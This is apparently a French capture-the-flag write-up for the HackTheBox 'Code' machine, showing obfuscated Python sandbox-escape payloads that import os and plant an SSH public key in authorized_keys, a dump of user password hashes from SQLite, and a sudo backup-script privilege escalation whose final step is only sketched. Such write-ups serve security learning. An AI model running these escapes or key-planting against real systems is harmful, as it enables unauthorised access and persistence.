# Challenge CTF: CODE HTB

## Exploration Initiale

Nous remarquons que le port **5000** est ouvert avec le protocole **HTTP**. En y accédant, nous découvrons un compilateur Python en ligne. Nous essayons donc dans un premier temps de lister les classes disponibles avec le script suivant :

```python
for i, cls in enumerate(''.__class__.__mro__[1].__subclasses__()):
    print(f"Index {i}: {cls.__name__}")
```

Ce script fonctionne et nous renvoie un résultat utile.

---

## Création d'un accès SSH

Nous constatons que l'utilisateur n'a pas de dossier **.ssh**. Nous allons donc en créer un afin d'établir une connexion SSH ultérieurement.

### Création du dossier `.ssh`

```python
b = (0).__class__.__base__.__subclasses__()[138].__init__.__globals__
i = b['__bui' + 'ltins__']
i['__im' + 'port__']('o'+'s').__getattribute__('make' + 'dirs')('/home/app-production/.ssh/')
```

### Ajout de notre clé publique SSH

```python
f = ''.__class__.__mro__[1].__subclasses__()[133].__init__.__globals__['__bui'+'ltins__']['op'+'en']('/home/app-production/.ssh/authorized_keys', 'w')
getattr(f, 'w'+'rite')('ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAa4YWMYFMgqwAKvvz4HsksklM78XxsjF6mGuwKcJOdpxhYBNNDyyh/WBGYI/zoEQCQBuZjjm+jgEJYsyNLOAt8= kali@kali')
getattr(f, 'clo'+'se')()
```

---

## Accès à la base de données SQLite

Nous trouvons des indices dans un fichier de configuration indiquant la présence d'une base de données **SQLite3**.

### Localisation de la base de données

```bash
app-production@code:~$ find / -name "database.db" 2>/dev/null
/home/app-production/app/instance/database.db
/home/app-production/instance/database.db
```

### Exploration de la base de données

```bash
app-production@code:~$ sqlite3 /home/app-production/app/instance/database.db
SQLite version 3.31.1 2020-01-27 19:55:54
Enter ".help" for usage hints.
```

#### Récupération des tables disponibles

```sql
sqlite> .tables
code  user
```

#### Extraction des utilisateurs et mots de passe

```sql
sqlite> select * from user;
1|root|new_root_password
2|martin|3de6f30c4a09c27fc71932bfc68474be
3|sojlen|202cb962ac59075b964b07152d234b70
```

Nous obtenons ainsi le mot de passe de **Martin**.

---

## Escalade de Privilèges

En nous connectant avec l'utilisateur **Martin**, nous utilisons la commande suivante :

```bash
martin@code:~$ sudo -l
```

Nous découvrons un script **/usr/bin/backy.sh** qui peut être exécuté avec sudo.

### Contenu du script `backy.sh`

```bash
#!/bin/bash

if [[ $# -ne 1 ]]; then
    /usr/bin/echo "Usage: $0 <task.json>"
    exit 1
fi

json_file="$1"

if [[ ! -f "$json_file" ]]; then
    /usr/bin/echo "Error: File '$json_file' not found."
    exit 1
fi

allowed_paths=("/var/" "/home/")

updated_json=$(/usr/bin/jq '.directories_to_archive |= map(gsub("\.\./"; ""))' "$json_file")

/usr/bin/echo "$updated_json" > "$json_file"

directories_to_archive=$(/usr/bin/echo "$updated_json" | /usr/bin/jq -r '.directories_to_archive[]')

is_allowed_path() {
    local path="$1"
    for allowed_path in "${allowed_paths[@]}"; do
        if [[ "$path" == $allowed_path* ]]; then
            return 0
        fi
    done
    return 1
}

for dir in $directories_to_archive; do
    if ! is_allowed_path "$dir"; then
        /usr/bin/echo "Error: $dir is not allowed. Only directories under /var/ and /home/ are allowed."
        exit 1
    fi
done

/usr/bin/backy "$json_file"
```

Nous exploitons une faille dans le script pour exécuter des commandes arbitraires.

### Exploitation

Nous pouvons utiliser **tar** pour extraire du contenu sensible dans `/home/martin/backup/` :

```bash
tar -xvf code
```

Cela nous donne accès aux fichiers nécessaires pour obtenir l'accès root.

---

## Récupération du Flag Root

En exploitant la vulnérabilité du script, nous obtenons un accès **root**, nous permettant de lire le fichier **/root/root.txt**.


